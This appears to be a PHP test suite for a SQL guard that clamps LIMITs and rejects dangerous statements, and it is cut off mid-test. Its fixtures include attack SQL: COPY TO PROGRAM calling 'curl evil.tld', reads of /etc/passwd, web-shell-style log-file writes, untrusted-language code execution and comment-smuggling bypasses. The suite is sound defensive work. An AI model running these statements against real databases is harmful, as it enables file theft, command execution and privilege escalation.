<?php

use App\Enums\DbDriver;
use App\Enums\StatementType;
use App\Services\Sql\InspectionResult;
use App\Services\Sql\SqlInspector;

function inspect(string $sql, ?DbDriver $driver = null): InspectionResult
{
    return app(SqlInspector::class)->inspect($sql, $driver);
}

test('select without limit gets the default limit injected', function () {
    $result = inspect('SELECT * FROM users');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toBe("SELECT * FROM users\nLIMIT 1000")
        ->and($result->statements[0]->limitInjected)->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
});

test('select with a reasonable limit is untouched', function () {
    $result = inspect('SELECT * FROM users LIMIT 50');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 50')
        ->and($result->statements[0]->limitInjected)->toBeFalse()
        ->and($result->statements[0]->limitClamped)->toBeFalse();
});

test('select limit above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

test('mysql offset-comma limit clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 10, 20000');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10, 10000');
});

test('limit-offset form clamps the count only', function () {
    $result = inspect('SELECT * FROM users LIMIT 99999 OFFSET 4');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000 OFFSET 4');
});

test('subquery limits are ignored when guarding the outer query', function () {
    $result = inspect('SELECT * FROM (SELECT id FROM t LIMIT 5) q');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM (SELECT id FROM t LIMIT 5) q\nLIMIT 1000");
});

test('limit is injected before a locking clause', function () {
    $result = inspect('SELECT * FROM jobs FOR UPDATE');

    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM jobs\nLIMIT 1000\nFOR UPDATE");
});

test('limit all is clamped to the hard cap', function () {
    $result = inspect('SELECT * FROM users LIMIT ALL');

    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 10000');
});

test('update without where is rejected', function () {
    $result = inspect('UPDATE users SET active = 0');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('delete without where is rejected', function () {
    $result = inspect('DELETE FROM users');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('WHERE');
});

test('update with where passes and is classified as write', function () {
    $result = inspect('UPDATE users SET active = 0 WHERE id = 5');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->statements[0]->preparedSql)->toBe('UPDATE users SET active = 0 WHERE id = 5');
});

test('multiple statements without a transaction are rejected', function () {
    $result = inspect('UPDATE a SET x=1 WHERE id=1; UPDATE b SET y=2 WHERE id=2');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('explicit transaction');
});

test('an explicit transaction with multiple writes passes', function () {
    $result = inspect("BEGIN;\nUPDATE a SET x=1 WHERE id=1;\nINSERT INTO logs(msg) VALUES ('x');\nCOMMIT;");

    expect($result->passes())->toBeTrue()
        ->and($result->isTransaction)->toBeTrue()
        ->and($result->statements)->toHaveCount(2)
        ->and($result->type())->toBe(StatementType::Write);
});

test('where guard applies inside transactions', function () {
    $result = inspect('BEGIN; DELETE FROM users; COMMIT;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('WHERE');
});

test('begin without commit is rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('COMMIT');
});

test('rollback statements are rejected', function () {
    $result = inspect('BEGIN; UPDATE a SET x=1 WHERE id=1; ROLLBACK;');

    expect($result->passes())->toBeFalse()
        ->and(implode(' ', $result->violations))->toContain('ROLLBACK');
});

test('forbidden administrative statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE prod',
    'GRANT ALL ON *.* TO joe',
    'REVOKE SELECT ON db.t FROM joe',
    'CREATE USER hacker IDENTIFIED BY "x"',
    'SET GLOBAL general_log = 1',
]);

test('show and explain are classified as reads without limit injection', function () {
    expect(inspect('SHOW TABLES')->type())->toBe(StatementType::Read)
        ->and(inspect('SHOW TABLES')->statements[0]->preparedSql)->toBe('SHOW TABLES')
        ->and(inspect('EXPLAIN SELECT * FROM t')->type())->toBe(StatementType::Read);
});

test('a cte wrapping a write is classified as write', function () {
    $result = inspect('WITH doomed AS (SELECT id FROM t) DELETE FROM t WHERE id IN (SELECT id FROM doomed)');

    expect($result->type())->toBe(StatementType::Write);
});

test('a pure cte select is read and gets a limit', function () {
    $result = inspect('WITH recent AS (SELECT * FROM t) SELECT * FROM recent');

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable dialect-specific selects still get guarded best-effort', function () {
    $result = inspect("SELECT id::text FROM users WHERE meta @> '{}'");

    expect($result->type())->toBe(StatementType::Read)
        ->and($result->statements[0]->preparedSql)->toEndWith('LIMIT 1000');
});

test('unparseable update without where is still rejected', function () {
    $result = inspect('UPDATE users SET meta = meta || \'{"a":1}\'::jsonb');

    expect($result->passes())->toBeFalse();
});

test('empty and comment-only input is rejected', function () {
    expect(inspect('')->passes())->toBeFalse()
        ->and(inspect('-- just a comment')->passes())->toBeFalse()
        ->and(inspect('/* block */')->passes())->toBeFalse();
});

test('insert is a write and passes without where', function () {
    $result = inspect('INSERT INTO t (a) VALUES (1)');

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
});

test('semicolons inside string literals do not split statements', function () {
    $result = inspect("SELECT * FROM t WHERE name = 'a;b'");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1);
});

test('trailing semicolon does not create a phantom statement', function () {
    $result = inspect('SELECT * FROM t;');

    expect($result->statements)->toHaveCount(1)
        ->and($result->passes())->toBeTrue();
});

// --- Regression: guard bypasses found in the 2026-09-07 security scan ---

test('forbidden statements cannot be smuggled past the guard with comments', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'leading block comment' => '/* hi */ DROP DATABASE prod',
    'inline comment between keywords' => 'DROP/**/DATABASE prod',
    'leading line comment' => "-- x\nGRANT ALL ON *.* TO 'x'@'%'",
    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL general_log = 1',
]);

test('file-IO statements are always rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SELECT INTO OUTFILE' => "SELECT * FROM users INTO OUTFILE '/tmp/x'",
    'SELECT INTO DUMPFILE' => "SELECT * FROM users INTO DUMPFILE '/tmp/x'",
    'LOAD DATA INFILE' => "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
    'COPY TO program' => "COPY t TO PROGRAM 'curl evil.tld'",
    'LOAD_FILE call' => "SELECT LOAD_FILE('/etc/passwd')",
]);

test('a data-modifying CTE is classified as a write, not a read', function () {
    $result = inspect('WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT * FROM x');

    expect($result->type())->toBe(StatementType::Write);
});

test('a trailing line comment cannot swallow the injected limit', function (string $sql) {
    $prepared = inspect($sql)->statements[0]->preparedSql;

    // The injected LIMIT must sit on its own line, outside the comment.
    expect($prepared)->toContain("\nLIMIT 1000")
        ->and($prepared)->toEndWith('LIMIT 1000');
})->with([
    'dash comment' => 'SELECT * FROM users --',
    'hash comment' => 'SELECT * FROM users #',
]);

test('an arithmetic or otherwise unparseable LIMIT is rejected, not left unclamped', function () {
    $result = inspect('SELECT * FROM users LIMIT 100*100000');

    expect($result->passes())->toBeFalse();
});

test('FETCH FIRST n ROWS ONLY above the hard cap is clamped', function () {
    $result = inspect('SELECT * FROM users ORDER BY id FETCH FIRST 9999999 ROWS ONLY');

    expect($result->passes())->toBeTrue()
        ->and($result->statements[0]->preparedSql)->toContain('FETCH FIRST 10000 ROWS ONLY')
        ->and($result->statements[0]->limitClamped)->toBeTrue();
});

// --- Regression: denylist gaps found in the 2026-09-18 security scan ---

test('privilege-escalation and code-execution statements are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'SET @@GLOBAL variable syntax' => "SET @@GLOBAL.general_log_file = '/var/www/s.php'",
    'SET @@global lowercase' => 'SET @@global.general_log = 1',
    'SET @@GLOBAL with loose spacing' => 'SET @@ GLOBAL . general_log = 1',
    'SET @@GLOBAL behind a comment' => 'SET/**/@@GLOBAL.general_log = 1',
    'SET PERSIST' => 'SET PERSIST general_log = 1',
    'SET @@PERSIST variable syntax' => 'SET @@PERSIST.general_log = 1',
    'MySQL UDF via SONAME' => "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'",
    'MySQL aggregate UDF via SONAME' => "CREATE AGGREGATE FUNCTION agg RETURNS INT SONAME 'udf.so'",
    'CREATE EXTENSION' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'PostgreSQL anonymous code block' => 'DO LANGUAGE plpythonu $$ import os; os.system("id") $$',
]);

test('postgresql file-IO functions are rejected even inside a read', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'pg_read_file' => "SELECT pg_read_file('/etc/passwd')",
    'schema-qualified pg_read_file' => "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    'pg_read_binary_file' => "SELECT pg_read_binary_file('/etc/passwd')",
    'pg_ls_dir' => "SELECT pg_ls_dir('/')",
    'lo_import' => "SELECT lo_import('/etc/passwd')",
    'lo_export' => "SELECT lo_export(1, '/tmp/x')",
]);

test('legitimate statements are not caught by the widened denylist', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'UPDATE ... SET' => 'UPDATE t SET x = 1 WHERE id = 1',
    'SET NAMES' => 'SET NAMES utf8mb4',
    'SET SESSION' => "SET SESSION time_zone = '+00:00'",
    'SET @@SESSION variable syntax' => "SET @@SESSION.time_zone = '+00:00'",
    'user variable' => 'SET @x = 1',
    'file-IO name inside a string literal' => "SELECT * FROM logs WHERE action = 'pg_read_file'",
    'file-IO name as a column' => 'SELECT pg_read_file AS x FROM t',
    'file-IO name as a table prefix' => 'SELECT * FROM pg_ls_dir_audit',
    'SQL-bodied CREATE FUNCTION' => 'CREATE FUNCTION f() RETURNS int RETURN 1',
]);

test('DROP TABLE and TRUNCATE pass as approval-gated writes flagged as DDL', function (string $sql) {
    $result = inspect($sql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue();
})->with([
    'DROP TABLE old_logs',
    'TRUNCATE TABLE sessions',
]);

// --- Targeted rules: judge the dangerous part, not the syntax (2026-09-18) ---

test('legitimate DBA statements the blanket denylist used to block now pass', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION' => 'CREATE EXTENSION pg_stat_statements',
    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS pgcrypto',
    'quoted extension name' => 'CREATE EXTENSION "uuid-ossp"',
    'extension WITH SCHEMA and CASCADE' => 'CREATE EXTENSION IF NOT EXISTS postgis WITH SCHEMA public CASCADE',
    'DO block with the implicit plpgsql default' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'DO block with a leading LANGUAGE clause' => 'DO LANGUAGE plpgsql $$ BEGIN PERFORM 1; END $$',
    'DO block with a trailing LANGUAGE clause' => 'DO $$ BEGIN PERFORM 1; END $$ LANGUAGE plpgsql',
    'SET GLOBAL' => 'SET GLOBAL max_connections = 500',
    'SET @@GLOBAL variable syntax' => 'SET @@GLOBAL.wait_timeout = 600',
    'SET PERSIST' => 'SET PERSIST max_connections = 500',
    'SET GLOBAL with several harmless variables' => 'SET GLOBAL max_connections = 500, wait_timeout = 600',
    'SET GLOBAL TRANSACTION' => 'SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE',
]);

test('untrusted procedural languages are rejected however they are spelled', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'CREATE EXTENSION plpythonu' => 'CREATE EXTENSION plpythonu',
    'CREATE EXTENSION IF NOT EXISTS plperlu' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
    'double-quoted extension name' => 'CREATE EXTENSION "plpythonu"',
    'backtick-quoted extension name' => 'CREATE EXTENSION `pltclu`',
    'single-quoted extension name' => "CREATE EXTENSION 'plperlu'",
    'lowercase keywords, uppercase name' => 'create extension PLPYTHON3U',
    'comments wedged into IF NOT EXISTS' => 'CREATE EXTENSION IF/**/NOT/**/EXISTS plpythonu',
    'untrusted extension WITH SCHEMA' => 'CREATE EXTENSION plsh WITH SCHEMA public',
    'DO with a leading LANGUAGE clause' => 'DO LANGUAGE plpythonu $$ import os $$',
    'DO with a trailing LANGUAGE clause' => 'DO $$ import os $$ LANGUAGE plpythonu',
    'DO with a quoted language name' => 'DO $$ import os $$ LANGUAGE "plperlu"',
    'DO with a custom dollar tag' => 'DO $py$ import os $py$ LANGUAGE plpython3u',
    'DO with a single-quoted body' => "DO 'import os' LANGUAGE plpythonu",
]);

test('persistent writes to file / code / protection variables are rejected', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'general_log_file' => "SET @@GLOBAL.general_log_file = '/var/www/x.php'",
    'general_log' => 'SET GLOBAL general_log = 1',
    'secure_file_priv' => "SET PERSIST secure_file_priv = ''",
    'local_infile' => 'SET GLOBAL local_infile = 1',
    'plugin_load_add' => "SET GLOBAL plugin_load_add = 'x'",
    'init_connect' => "SET GLOBAL init_connect = 'x'",
    'slow_query_log_file' => "SET GLOBAL slow_query_log_file = '/tmp/x'",
    'log_error' => "SET PERSIST log_error = '/tmp/x'",
    'backtick-quoted variable name' => 'SET GLOBAL `general_log` = 1',
    'double-quoted variable name' => 'SET GLOBAL "general_log" = 1',
    'the := assignment form' => 'SET GLOBAL general_log:=1',
    'PERSIST_ONLY scope' => 'SET PERSIST_ONLY general_log = 1',
    'hidden behind a harmless first assignment' => 'SET GLOBAL max_connections = 500, general_log = 1',
]);

test('a violation names the extension and the reason it was refused', function () {
    $result = inspect('CREATE EXTENSION plpythonu');

    expect($result->passes())->toBeFalse()
        ->and($result->violations[0])->toContain('plpythonu')
        ->and($result->violations[0])->toContain('untrusted procedural language');
});

test('a dollar-quoted body is one statement, not one per semicolon inside it', function () {
    $result = inspect("DO \$fix\$\nBEGIN\n  UPDATE t SET x = 1 WHERE id = 2;\n  UPDATE u SET y = 2 WHERE id = 3;\nEND\n\$fix\$");

    expect($result->passes())->toBeTrue()
        ->and($result->statements)->toHaveCount(1)
        ->and($result->type())->toBe(StatementType::Write);
});

test('dollar quoting cannot hide a following statement from the guard', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'unterminated tag' => 'SELECT 1 $$; DROP DATABASE prod',
    'tag inside a string literal' => "SELECT '\$\$'; DROP DATABASE prod",
    'tag inside a line comment' => "-- \$\$\nDROP DATABASE prod",
    'mismatched open and close tags' => 'DO $a$ x $b$; DROP DATABASE prod',
    'statement appended after a real body' => 'DO $$ BEGIN PERFORM 1; END $$; DROP DATABASE prod',
]);

test('the guard lists are extended by configuration and cannot be shortened by it', function () {
    config([
        'queryproxy.untrusted_languages' => ['plevil'],
        'queryproxy.dangerous_variables' => ['evil_var'],
    ]);

    expect(inspect('CREATE EXTENSION plevil')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plevil')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL evil_var = 1')->passes())->toBeFalse()
        // The built-in floor survives a configuration that no longer names it.
        ->and(inspect('CREATE EXTENSION plpythonu')->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL general_log = 1')->passes())->toBeFalse();
});

test('the unconditional denylist cannot be carried through a DO block body', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with([
    'DROP DATABASE' => 'DO $$ BEGIN DROP DATABASE prod; END $$',
    'DROP SCHEMA' => 'DO $$ BEGIN DROP SCHEMA public CASCADE; END $$',
    'GRANT' => 'DO $$ BEGIN GRANT ALL ON *.* TO x; END $$',
    'REVOKE' => 'DO $$ BEGIN REVOKE SELECT ON t FROM x; END $$',
    'CREATE USER' => 'DO $$ BEGIN CREATE USER hacker; END $$',
    'pg_read_file' => "DO \$\$ BEGIN PERFORM pg_read_file('/etc/passwd'); END \$\$",
    'lo_export' => "DO \$\$ BEGIN PERFORM lo_export(1, '/tmp/x'); END \$\$",
    'COPY TO PROGRAM' => "DO \$\$ BEGIN COPY t TO PROGRAM 'curl evil.tld'; END \$\$",
    'behind an IF ... THEN' => 'DO $$ BEGIN IF x = 1 THEN DROP DATABASE prod; END IF; END $$',
    'quoted with a nested dollar tag' => 'DO $$ BEGIN EXECUTE $q$GRANT ALL ON *.* TO x$q$; END $$',
    'single-quoted body' => "DO 'BEGIN DROP DATABASE prod; END' LANGUAGE plpgsql",
]);

test('the DO body scan does not reject an ordinary plpgsql block', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'plain update' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
    'plain perform' => 'DO $$ BEGIN PERFORM 1; END $$',
    'a declared name that merely starts with a keyword' => 'DO $$ DECLARE copy_count int; BEGIN SELECT count(*) INTO copy_count FROM t; END $$',
    'a table name that merely starts with a keyword' => 'DO $$ BEGIN INSERT INTO outfile_log (a) VALUES (1); END $$',
    'a forbidden statement as literal data, not as code' => "DO \$\$ BEGIN UPDATE audit SET note = 'DROP DATABASE prod' WHERE id = 1; END \$\$",
]);

test('an untrusted language is caught by the pl...u convention, not only by name', function () {
    // plpython4u is in no list; the naming convention is what refuses it.
    expect(inspect('CREATE EXTENSION plpython4u')->passes())->toBeFalse()
        ->and(inspect('DO $$ x $$ LANGUAGE plpython4u')->passes())->toBeFalse();
});

test('trusted procedural languages are not caught by the convention', function (string $sql) {
    expect(inspect($sql)->passes())->toBeTrue();
})->with([
    'CREATE EXTENSION plpgsql',
    'CREATE EXTENSION pltcl',
    'CREATE EXTENSION plperl',
    'CREATE EXTENSION plv8',
    'CREATE EXTENSION pllua',
]);

test('EXPLAIN ANALYZE is judged by the statement it executes', function () {
    $delete = inspect('EXPLAIN ANALYZE DELETE FROM t', DbDriver::Pgsql);
    $update = inspect('EXPLAIN (ANALYZE, BUFFERS) UPDATE t SET a=1 WHERE id=1', DbDriver::Pgsql);
    $select = inspect('EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql);

    expect($delete->passes())->toBeFalse()
        ->and($delete->type())->toBe(StatementType::Write)
        ->and($update->passes())->toBeTrue()
        ->and($update->type())->toBe(StatementType::Write)
        ->and($select->passes())->toBeTrue()
        ->and($select->type())->toBe(StatementType::Read);
});

test('EXPLAIN without ANALYZE stays a read', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'plain' => 'EXPLAIN DELETE FROM t WHERE id=1',
    'ANALYZE switched off' => 'EXPLAIN (ANALYZE false) DELETE FROM t',
    'ANALYZE off among other options' => 'EXPLAIN (ANALYZE off, COSTS) UPDATE t SET a = 1',
    'VERBOSE only' => 'EXPLAIN VERBOSE DELETE FROM t',
]);

test('EXPLAIN ANALYZE spellings all run the inner statement', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe(StatementType::Write);
})->with([
    'legacy with VERBOSE' => 'EXPLAIN ANALYZE VERBOSE UPDATE t SET a=1 WHERE id=1',
    'British spelling' => 'EXPLAIN ANALYSE UPDATE t SET a=1 WHERE id=1',
    'option list, true' => 'EXPLAIN (ANALYZE true, BUFFERS) UPDATE t SET a=1 WHERE id=1',
    'option list, on' => 'EXPLAIN (FORMAT JSON, ANALYZE on) UPDATE t SET a=1 WHERE id=1',
    'option list, 1' => 'EXPLAIN (ANALYZE 1) UPDATE t SET a=1 WHERE id=1',
    'lower case' => 'explain (analyze) update t set a=1 where id=1',
    'mysql' => 'EXPLAIN ANALYZE UPDATE t SET a=1 WHERE id=1',
]);

test('an EXPLAIN option block that cannot be read is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'unclosed option list' => 'EXPLAIN (ANALYZE',
    'unclosed with a statement' => 'EXPLAIN (ANALYZE SELECT 1',
    'ANALYZE value that is not a boolean' => 'EXPLAIN (ANALYZE maybe) SELECT 1',
    'empty option' => 'EXPLAIN (ANALYZE,, BUFFERS) SELECT 1',
    'ANALYZE without a statement' => 'EXPLAIN ANALYZE',
]);

test('EXPLAIN ANALYZE carries the inner denylist and limit without touching the option block', function () {
    $forbidden = inspect('EXPLAIN ANALYZE DROP DATABASE prod', DbDriver::Pgsql);
    $select = inspect('EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM t', DbDriver::Pgsql);

    expect($forbidden->passes())->toBeFalse()
        ->and($select->type())->toBe(StatementType::Read)
        ->and($select->preparedSql())->toStartWith('EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM t')
        ->and($select->preparedSql())->toContain('LIMIT');
});

test('EXPLAIN ANALYZE nested past the depth limit is rejected', function () {
    expect(inspect('EXPLAIN ANALYZE EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql)->passes())->toBeTrue()
        ->and(inspect('EXPLAIN ANALYZE EXPLAIN ANALYZE EXPLAIN ANALYZE EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql)->passes())->toBeFalse();
});

test('SELECT INTO a table is a DDL write without a limit', function (DbDriver $driver) {
    $result = inspect('SELECT * INTO t2 FROM t', $driver);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue()
        ->and($result->preparedSql())->toBe('SELECT * INTO t2 FROM t');
})->with([
    'pgsql' => DbDriver::Pgsql,
    'sqlsrv' => DbDriver::Sqlsrv,
]);

test('SELECT INTO a temporary table is a DDL write', function () {
    $result = inspect('SELECT * INTO TEMP t2 FROM t', DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue();
});

test('SELECT INTO a MySQL user variable stays a read', function () {
    $result = inspect('SELECT a INTO @x FROM t LIMIT 1', DbDriver::Mysql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->hasDdl())->toBeFalse();
});

test('INTO inside a subquery or a literal does not make a SELECT a write', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe(StatementType::Read);
})->with([
    "SELECT 'INTO t2' FROM t",
    'SELECT * FROM t -- INTO t2',
]);

test('server control and remote channel functions are rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'terminate backend' => 'SELECT pg_terminate_backend(123)',
    'cancel backend' => 'SELECT pg_cancel_backend(pid) FROM pg_stat_activity',
    'reload conf' => 'SELECT pg_reload_conf()',
    'promote' => 'SELECT pg_promote()',
    'dblink' => "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
    'dblink exec' => "SELECT dblink_exec('host=x', 'DROP TABLE t')",
    'upper case' => 'SELECT PG_TERMINATE_BACKEND(1)',
    'double-quoted name' => 'SELECT "pg_terminate_backend"(1)',
    'space before the parenthesis' => 'SELECT pg_reload_conf ()',
    'schema-qualified' => 'SELECT pg_catalog.pg_terminate_backend(1)',
]);

test('set_config is judged like SET', function (string $sql, bool $passes) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBe($passes)
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'dangerous literal name' => ["SELECT set_config('LOCAL_INFILE', 'on', false)", false],
    'harmless literal name' => ["SELECT set_config('application_name', 'x', false)", true],
    'name from a column' => ['SELECT set_config(name, setting, false) FROM pg_settings', false],
    'concatenated name' => ["SELECT set_config('local_' || 'infile', 'on', false)", false],
]);

test('state-changing functions make a SELECT a write', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'nextval' => "SELECT nextval('seq')",
    'setval' => "SELECT setval('seq', 10)",
    'advisory lock' => 'SELECT pg_advisory_lock(1)',
    'advisory lock, shared variant' => 'SELECT pg_advisory_lock_shared(1)',
    'transaction advisory lock' => 'SELECT pg_advisory_xact_lock(1)',
    'mysql named lock' => "SELECT GET_LOCK('x', 10)",
    'mysql named lock release' => "SELECT RELEASE_LOCK('x')",
]);

test('resource-consuming functions make a SELECT a write', function (string $sql) {
    $result = inspect($sql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'pg_sleep' => 'SELECT pg_sleep(10)',
    'pg_sleep_for' => "SELECT pg_sleep_for('5 minutes')",
    'mysql sleep' => 'SELECT SLEEP(10)',
    'mysql backtick sleep' => 'SELECT `sleep`(10)',
    'mysql benchmark' => "SELECT BENCHMARK(1000000, MD5('x'))",
]);

test('a function name that is not called does not trigger a rule', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'inside a string literal' => "SELECT 'pg_sleep(1)'",
    'inside a line comment' => 'SELECT 1 -- dblink(',
    'inside a block comment' => 'SELECT 1 /* pg_terminate_backend(1) */',
    'inside a dollar-quoted body' => 'SELECT $$pg_terminate_backend(1)$$',
    'inside a tagged dollar-quoted body' => 'SELECT $q$ nextval(1) $q$',
    'as a column name' => 'SELECT sleep FROM t',
    'as a longer function name' => 'SELECT my_pg_sleep(1)',
]);

test('configured function lists extend the built-in lists', function () {
    config([
        'queryproxy.blocked_functions' => ['lo_unlink'],
        'queryproxy.state_changing_functions' => ['audit_touch'],
        'queryproxy.resource_consuming_functions' => [],
    ]);

    expect(inspect('SELECT lo_unlink(1)')->passes())->toBeFalse()
        ->and(inspect('SELECT audit_touch(1)')->type())->toBe(StatementType::Write)
        ->and(inspect('SELECT pg_sleep(1)')->type())->toBe(StatementType::Write)
        ->and(inspect('SELECT pg_terminate_backend(1)')->passes())->toBeFalse();
});

test('EXPLAIN ANALYZE is recognised however it is spaced', function (string $sql, bool $passes) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->passes())->toBe($passes);
})->with([
    'no space after EXPLAIN' => ['EXPLAIN(ANALYZE) DELETE FROM t', false],
    'no space anywhere' => ['EXPLAIN(ANALYZE)DELETE FROM t', false],
    'two options, no space' => ['EXPLAIN(ANALYZE,BUFFERS)UPDATE t SET a=1 WHERE id=1', true],
    'two options' => ['EXPLAIN(ANALYZE, BUFFERS) UPDATE t SET a=1 WHERE id=1', true],
    'comment as separator' => ['EXPLAIN/**/ANALYZE/**/DELETE FROM t', false],
]);

test('an EXPLAIN option the guard does not know is rejected', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'quoted ANALYZE' => 'EXPLAIN ("analyze") DELETE FROM t WHERE id=1',
    'quoted ANALYZE with a value' => 'EXPLAIN ("analyze" true) DELETE FROM t WHERE id=1',
    'U& escaped ANALYZE' => 'EXPLAIN (U&"\0061nalyze") DELETE FROM t WHERE id=1',
    'backticked ANALYZE' => 'EXPLAIN (`analyze`) DELETE FROM t WHERE id=1',
    'unknown option' => 'EXPLAIN (FROBNICATE) DELETE FROM t WHERE id=1',
    'option with an expression value' => 'EXPLAIN (COSTS (true)) DELETE FROM t WHERE id=1',
    'ANALYZE yes, not a defGetBoolean value' => 'EXPLAIN (ANALYZE yes) DELETE FROM t WHERE id=1',
    'ANALYZE with an escaped string value' => "EXPLAIN (ANALYZE 'o\\ff') DELETE FROM t WHERE id=1",
    'wrapped in parentheses' => '(EXPLAIN ANALYZE DELETE FROM t WHERE id=1)',
]);

test('EXPLAIN boolean values follow PostgreSQL', function (string $sql, StatementType $type) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe($type);
})->with([
    'quoted true' => ["EXPLAIN (ANALYZE 'true') UPDATE t SET a=1 WHERE id=1", StatementType::Write],
    'upper-case ON' => ['EXPLAIN (ANALYZE ON) UPDATE t SET a=1 WHERE id=1', StatementType::Write],
    'zero' => ['EXPLAIN (ANALYZE 0) UPDATE t SET a=1 WHERE id=1', StatementType::Read],
    'quoted off' => ["EXPLAIN (ANALYZE 'off') UPDATE t SET a=1 WHERE id=1", StatementType::Read],
]);

test('EXPLAIN of a parenthesised statement is read as the statement', function () {
    $result = inspect('EXPLAIN (SELECT * FROM t)', DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
});

test('SELECT INTO a table is caught however it is spaced or wrapped', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue()
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'no space around the star' => 'SELECT*INTO t2 FROM t',
    'comment as separator' => 'SELECT/**/*/**/INTO/**/t2/**/FROM t',
    'wrapped in parentheses' => '(SELECT * INTO t2 FROM t)',
    'wrapped and unioned' => '(SELECT * INTO t2 FROM t) UNION SELECT * FROM t3',
